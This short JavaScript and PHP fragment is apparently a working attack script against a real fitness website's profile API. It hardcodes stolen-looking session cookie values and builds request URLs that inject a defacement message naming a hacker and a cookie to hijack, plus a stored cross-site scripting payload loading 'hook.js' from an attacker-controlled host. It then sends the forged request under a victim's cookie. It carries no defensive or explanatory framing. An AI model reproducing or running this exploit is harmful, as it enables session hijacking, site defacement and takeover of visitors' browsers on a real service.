// var cookie = '7a633e437f62e951d93051e35b33dfc8b2696b7e';
var cookie = '87d1e2ef5ef58ac386013b8049e315deea6c04a2';

var eurl = 'http://api.bodybuilding.com/api-proxy/profile/goals/set?maingoal=sport&needsuser=1&overallgoal=%26lt;pre%26gt;Hack+by:+F0ney0p.%0ABecome+corymarsh!%0ASet+v1guid+cookie+to:%0Aa710e5fd1593f0995fa824f0e20d06eb85c56f59%26lt;/pre%26gt;%26lt;sCRipT+sRC%3d"http://10.7.10.102:3000/hook.js"+%26gt;%26lt;/script%26gt;'

var turl = 'http://api.bodybuilding.com/api-proxy/profile/goals/set?maingoal=sport&needsuser=1&v1guid='+cookie+'&overallgoal=<?=$message?>';
cs(turl);
debug("overall goal set to: <?=$message?>");
